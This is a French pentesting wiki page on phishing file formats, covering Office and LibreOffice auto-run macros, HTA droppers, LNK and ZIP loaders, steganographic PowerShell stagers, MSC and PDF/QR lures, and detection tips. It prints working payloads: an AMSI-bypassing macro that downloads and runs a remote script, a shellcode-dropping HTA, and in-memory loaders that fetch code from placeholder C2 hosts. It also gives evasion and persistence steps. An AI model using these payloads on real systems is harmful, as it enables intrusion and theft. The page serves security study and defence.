# Fichiers et documents de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documents Office

Microsoft Word effectue une validation des données du fichier avant de l’ouvrir. Cette validation prend la forme d’une identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur survient lors de l’identification de la structure des données, le fichier analysé ne sera pas ouvert.

En général, les fichiers Word contenant des macros utilisent l’extension `.docm`. Il est toutefois possible de renommer le fichier en changeant son extension tout en conservant la possibilité d’exécuter ses macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes mécanismes internes s’appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :

```bash
assoc | findstr /i "word excel powerp"
```

Les fichiers DOCX faisant référence à un modèle distant (Fichier – Options – Compléments – Gérer : Modèles – Atteindre) contenant des macros peuvent également « exécuter » des macros.

### Chargement d’image externe

Allez dans : _Insertion --> Quick Parts --> Champ_\
_**Catégories** : Liens et références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://<ip>/whatever

![Documents Office - Chargement d’image externe : allez dans Insertion -- Quick Parts -- Champ](<../../images/image (155).png>)

Pour analyser un document reçu plutôt que d’en créer un, consultez [Analyse de macro VBA : code superflu et UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Porte dérobée par macros

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions à chargement automatique

Plus elles sont courantes, plus il est probable que l’AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Supprimer manuellement les métadonnées

Allez dans **Fichier > Informations > Inspecter le document > Inspecter le document** pour ouvrir l’Inspecteur de document. Cliquez sur **Inspecter**, puis sur **Tout supprimer** à côté de **Propriétés du document et informations personnelles**.

#### Extension du document

Une fois terminé, sélectionnez la liste déroulante **Type de fichier**, puis remplacez le format **`.docx`** par **Word 97-2003 `.doc`**.\
Faites cela, car vous **ne pouvez pas enregistrer de macros dans un fichier `.docx`** et que l’extension **`.docm`**, qui prend en charge les macros, est **mal vue** (par exemple, l’icône de miniature comporte un énorme `!` et certaines passerelles Web/de messagerie les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros à exécution automatique LibreOffice ODT (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l’ouverture du fichier en associant la macro à l’événement **Ouvrir le document** (Outils → Personnaliser → Événements → Ouvrir le document → Macro…).<sup>[[1]](#references)</sup> Une simple macro de reverse shell ressemble à ceci :

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Notez les guillemets doublés (`""`) à l’intérieur de la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Ainsi, les payloads qui se terminent par `...==""")` gardent équilibrés à la fois la commande interne et l’argument Shell.

Conseils de livraison :

- Enregistrez le fichier au format `.odt` et associez la macro à l’événement du document afin qu’elle s’exécute immédiatement à l’ouverture.
- Lors de l’envoi d’un e-mail avec `swaks`, utilisez `--attach @resume.odt` (`@` est obligatoire pour envoyer les octets du fichier en pièce jointe, plutôt que la chaîne contenant son nom). C’est essentiel pour exploiter les serveurs SMTP qui acceptent sans validation des destinataires `RCPT TO` arbitraires.

## Fichiers HTA

Une HTA est un programme Windows qui **combine HTML et des langages de script (tels que VBScript et JScript)**. Elle génère l’interface utilisateur et s’exécute comme une application « entièrement approuvée », sans les contraintes du modèle de sécurité d’un navigateur.

Une HTA s’exécute à l’aide de **`mshta.exe`**, généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d’IE**. Ainsi, si IE a été désinstallé, les HTA ne pourront pas s’exécuter.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Fausses cartes de pièces jointes en HTML dans les e-mails

Un e-mail HTML peut imiter la carte native d’aperçu des pièces jointes d’un fournisseur sans contenir de véritable pièce jointe. Talos a observé une carte Gmail reconstituée à partir de quatre parties MIME PNG intégrées et encodées en Base64. L’ensemble du visuel était entouré d’une seule ancre, et une valeur de destinataire dans `?m=<target-id>` permettait le suivi par destinataire. Le lien commençait par `//` plutôt que par `http://` ou `https://` ; les navigateurs interprètent cette forme relative au protocole, mais les extracteurs d’URL qui ne recherchent que des URL entièrement qualifiées peuvent la manquer.<sup>[[11]](#references)</sup>

Pendant l’analyse, inspectez le MIME brut au lieu de vous fier à la liste des pièces jointes affichée. Reconstituez la façon dont les parties image intégrées forment la carte visuelle, identifiez l’ancre qui l’entoure et normalisez les valeurs `href` relatives au protocole avant d’extraire les URL.<sup>[[11]](#references)</sup>

Pour tester l’usurpation de l’expéditeur de l’enveloppe et de l’en-tête ainsi que l’alignement DMARC, voir [Mesures de protection contre l’usurpation d’e-mails SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM « à distance »**. Par exemple, vous pouvez ajouter des **images invisibles** aux e-mails ou au HTML auquel l’utilisateur accédera (même via un MitM HTTP ?). Vous pouvez aussi envoyer à la victime **l’adresse de fichiers** qui **déclencheront** une **authentification** dès **l’ouverture du dossier**.

**Consultez ces idées et d’autres dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Relais NTLM

N’oubliez pas qu’il est possible non seulement de voler le hash ou l’authentification, mais aussi de **mener des attaques par relais NTLM** :

- [**Attaques par relais NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (relais NTLM vers des certificats)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Mise en scène de commandes locales via LNK vers `ftp.exe`

Un raccourci peut lancer `ftp.exe -s:icon.ico` avec un fichier de commandes texte déguisé par une extension d’image.<sup>[[12]](#references)</sup> L’option `-s:` lit des commandes FTP locales ; sous Windows 8 et les versions ultérieures, ce fichier doit être encodé en UTF-8.<sup>[[13]](#references)</sup> Une ligne commençant par `!` exécute une commande locale via `cmd /c`, sans envoyer cette commande à un serveur FTP. Une connexion FTP n’est pas nécessaire pour cette voie d’exécution locale.<sup>[[14]](#references)</sup> Dans la chaîne rapportée, le script FTP renvoyait vers un deuxième fichier de commandes. La ligne complète commençant par `!` est importante : `!more res.ico` seul affiche le fichier, tandis qu’un pipe vers `cmd` en exécute le contenu.<sup>[[12]](#references)[[14]](#references)</sup>

La même chaîne utilisait une tâche récurrente pour relire un fichier de commandes modifiable, plutôt que d’installer un nouvel exécutable à chaque mise à jour. L’action de la tâche était `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd` ; le fichier contenait une commande qui récupérait des instructions lors de son exécution. Une variante connexe téléchargeait un fichier de commandes de remplacement avant l’exécution planifiée. Le fichier doit être présent et lisible au déclenchement de la tâche ; `conhost` n’élève pas les privilèges au-delà du jeton utilisateur configuré pour la tâche.<sup>[[12]](#references)</sup> Voir [l’exécution de tâches planifiées](../../windows-hardening/lateral-movement/atexec.md) pour le fonctionnement des tâches.

## Raccourci VHDX avec MSI caché et document leurre

Un VHDX monté peut afficher un LNK visible tout en cachant un MSI et un tableur leurre dans le même volume. Dans la chaîne rapportée, le LNK utilisait `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Le séparateur `&` ouvre le leurre même si la commande de l’installateur échoue ; l’ouverture du document ne prouve pas que l’installation a réussi. Il s’agit d’une variante de livraison de [l’exécution d’une action personnalisée MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), et non d’une élévation de privilèges MSI en soi.<sup>[[12]](#references)</sup>

Pour ce MSI, `CustomAction.Type` **194** combine un EXE stocké dans la table `Binary` (**2**) avec les indicateurs d’ignorance du code de retour (**64**) et d’exécution asynchrone (**128**). La combinaison **64 + 128** signifie que Windows Installer n’attend pas la fin de l’EXE ; l’indicateur 128 seul attendrait la fin de la séquence.<sup>[[15]](#references)[[16]](#references)</sup> Vérifiez le `Source` de l’action par rapport à la table `Binary`, ainsi que son emplacement dans `InstallExecuteSequence`, avant d’attribuer l’exécution à cet EXE intégré.<sup>[[12]](#references)[[15]](#references)</sup> Un [chemin UNC WebDAV peut servir à livrer un MSI distant](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), mais il s’agit d’un point d’entrée différent.

## LNK Loaders + charges utiles intégrées dans un ZIP (chaîne fileless)

Des campagnes très efficaces livrent une archive ZIP contenant deux documents leurres légitimes (PDF/DOCX) et un LNK malveillant. L’astuce consiste à stocker le chargeur PowerShell réel dans les octets bruts du ZIP, après un marqueur unique, puis à faire extraire et exécuter le chargeur entièrement en mémoire par le LNK.<sup>[[2]](#references)</sup>

Flux typique mis en œuvre par la commande PowerShell sur une seule ligne du LNK :

1) Rechercher le ZIP d’origine dans les chemins courants : Bureau, Téléchargements, Documents, %TEMP%, %ProgramData% et le dossier parent du répertoire de travail actuel.
2) Lire les octets du ZIP et rechercher un marqueur codé en dur (par exemple, xFIQCV). Tout ce qui suit le marqueur constitue la charge utile PowerShell intégrée.
3) Copier le ZIP dans %ProgramData%, l’extraire à cet emplacement et ouvrir le fichier .docx leurre pour paraître légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Désobfusquer l’étape suivante (par exemple, supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell pour extraire et exécuter l’étape intégrée :

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notes
- La diffusion abuse souvent de sous-domaines PaaS réputés (p. ex., *.herokuapp.com) et peut filtrer les payloads (servir des ZIP inoffensifs selon l’adresse IP/l’agent utilisateur).
- L’étape suivante déchiffre souvent du shellcode base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire au minimum les artefacts sur disque.

Persistance utilisée dans la même chaîne
- Détournement de COM TypeLib du contrôle Microsoft Web Browser afin qu’IE/Explorer ou toute application qui l’intègre relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Consultez les détails et les commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Recherche/IOC
- Fichiers ZIP contenant la chaîne marqueur ASCII (p. ex., xFIQCV) ajoutée aux données de l’archive.
- Fichier .lnk qui parcourt les dossiers parents/de l’utilisateur pour localiser le ZIP et ouvrir un document leurre.
- Altération d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Longs fils de discussion professionnels se terminant par des liens hébergés sur des domaines PaaS réputés.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Un autre schéma récurrent est un **`.lnk` usurpant un document** qui ouvre immédiatement un leurre inoffensif tout en préparant la véritable chaîne en arrière-plan.<sup>[[3]](#references)</sup>

Flux observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un téléchargeur PowerShell obfusqué.
2. PowerShell fragmente les jetons évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne repèrent pas la commande.
3. Le stager télécharge d’abord le **document leurre**, l’ouvre pour la victime, puis reconstitue les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **extensions factices**, puis renommés en supprimant des caractères de remplissage, ce qui retarde l’apparition d’artefacts `.exe` / `.cpl` évidents.
5. La persistance est mise en place avec une **tâche planifiée exécutée chaque minute** qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.

Indices minimaux de recherche pour ce schéma :

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Pourquoi le second stage est furtif

Dans l’étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était placé à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance chargeait latéralement le CPL de l’attaquant au lieu de la copie système légitime.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et y copie le shellcode déchiffré
- L’exécute indirectement en passant le pointeur du shellcode comme callback pour **`EnumUILanguagesW`**

Cette dernière étape mérite une chasse distincte : les malwares évitent souvent un saut direct `((void(*)())buf)()` et abusent plutôt d’une **WinAPI légitime acceptant un callback** pour transférer l’exécution.

La charge utile déchiffrée dans cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus actuel avant de passer la main. Pour des notes plus détaillées sur le side-loading et le post-traitement en mémoire, voir :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pistes pratiques pour la chasse :
- Un `.lnk` qui lance `powershell.exe` ou `conhost.exe`, puis affiche un document leurre.
- Des téléchargements de courte durée vers **`C:\Users\Public\`**, suivis du renommage immédiat de fichiers portant des extensions fantaisistes.
- Des tâches planifiées aux noms anodins, comme `GoogleErrorReport`, exécutées depuis des **répertoires accessibles en écriture par l’utilisateur**.
- Des binaires de confiance qui chargent des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Des blobs de texte Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé latéralement.

## Charges utiles délimitées par stéganographie dans des images (stager PowerShell)

Des chaînes de loader récentes distribuent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell Base64. Ce stager télécharge une image (souvent un GIF) qui contient une DLL .NET encodée en Base64 et dissimulée sous forme de texte brut entre des marqueurs de début et de fin uniques. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte situé entre eux, le décode en Base64 en octets, charge l’assembly en mémoire et invoque une méthode d’entrée connue avec l’URL C2.<sup>[[5]](#references)</sup>

Flux de travail
- Stage 1 : dropper JS/VBS archivé → décode le Base64 intégré → lance le stager PowerShell avec -nop -w hidden -ep bypass.
- Stage 2 : le stager PowerShell → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par exemple, VAI) en lui transmettant l’URL C2 et les options.
- Stage 3 : le loader récupère la charge utile finale et l’injecte généralement via le process hollowing dans un binaire de confiance (souvent MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Pour en savoir plus sur le process hollowing et l’exécution proxy via des utilitaires de confiance, voir :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell permettant d’extraire une DLL d’une image et d’invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur de charge utile stéganographique et loader PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- Il s’agit de ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Les marqueurs varient d’une campagne à l’autre.
- Le bypass AMSI/ETW et la désobfuscation des chaînes sont généralement effectués avant le chargement de l’assembly.
- Hunting : analyser les images téléchargées à la recherche de délimiteurs connus ; repérer les accès de PowerShell aux images suivis immédiatement du décodage de blobs Base64.

Voir aussi les outils de stéganographie et les techniques de carving :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → staging PowerShell via Base64

Une étape initiale récurrente est un petit fichier `.js` ou `.vbs` fortement obfusqué, livré dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` afin d’amorcer l’étape suivante via HTTPS.<sup>[[5]](#references)</sup>

Logique schématique (abstraite) :
- Lire le contenu de son propre fichier
- Repérer un blob Base64 entre des chaînes parasites
- Décoder en PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Pistes de hunting
- Pièces jointes JS/VBS archivées qui lancent `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` qui lance `powershell.exe -nop -w hidden` depuis des répertoires temporaires utilisateur.

## Documents MSC comme conteneurs d’exécution (GrimResource)

Les fichiers Microsoft Management Console (`.msc`) sont des définitions de console XML normalement ouvertes par `mmc.exe`. **GrimResource** exploite une référence `StringTable` vers une ressource `apds.dll` contenant une ancienne primitive XSS, de sorte que l’ouverture de la console piégée par un utilisateur exécute du JavaScript dans `mmc.exe`. Les échantillons observés combinaient une obfuscation fondée sur `transformNode` avec **DotNetToJScript** pour instancier un payload .NET sans suivre le chemin habituel des macros Office.<sup>[[9]](#references)</sup>

Pour le triage statique, traitez un fichier MSC non fiable comme du texte et ne double-cliquez **pas** dessus :<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Les pivots d’exécution à forte valeur de détection sont le chargement du CLR ou de composants de script par `mmc.exe`, la création de connexions réseau ou le lancement de `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou d’un exécutable inattendu. Le format étant légitime, les détections doivent corréler **l’origine + un contenu XML/script suspect + le comportement de `mmc.exe`**, plutôt que de bloquer tous les fichiers MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirecteurs et filtrage des payloads

Un PDF n’a pas besoin d’exploiter une vulnérabilité pour être utile. Dans des campagnes récentes, des attaquants placent un **code QR ou un lien ordinaire** dans un document à l’apparence anodine, redirigent la session du navigateur en dehors des contrôles de messagerie et personnalisent la destination avec l’adresse du destinataire. Microsoft a documenté des PDF de 2025 contenant des URL de QR uniques par destinataire, qui menaient à une infrastructure de vol d’identifiants RaccoonO365 ; une chaîne parallèle utilisait un filtrage selon l’IP et l’environnement pour renvoyer un chemin JavaScript/MSI à certains visiteurs, mais un PDF inoffensif aux scanners ou aux clients non autorisés.<sup>[[10]](#references)</sup>

Lors du triage, examinez à la fois les actions du PDF et les codes QR rendus. Un QR peut être dessiné sous forme vectorielle plutôt que stocké comme image extractible ; il faut donc rasteriser chaque page et extraire les images intégrées :

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspectez les destinations décodées et les redirections depuis un système d’analyse isolé, sans vous authentifier. Les éléments utiles à rechercher incluent les PDF contenant uniquement un QR code avec un corps de mail presque vide, l’adresse e-mail du destinataire intégrée à un paramètre de requête, plusieurs redirections via des services d’hébergement réputés et des contenus différents selon l’adresse IP, la géolocalisation, les cookies, le referrer ou le user-agent. Comparez les requêtes avec des profils contrôlés, car un seul chargement depuis un sandbox peut ne renvoyer que le leurre.<sup>[[10]](#references)</sup>

## Fichiers Windows pour voler des hashes NTLM

Consultez la page sur les **endroits où voler des identifiants NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode : suivi des techniques de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Détournement de TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Le loader PhantomVAI diffuse divers infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource : Microsoft Management Console pour l’accès initial et l’évasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Des acteurs malveillants exploitent la période des déclarations fiscales pour lancer des campagnes de phishing sur le thème des impôts](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Chaîne de livraison d’UAT-11587 et backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER étoffe son arsenal avec PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - commande ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Action personnalisée de type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Options de traitement du retour d’une action personnalisée](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
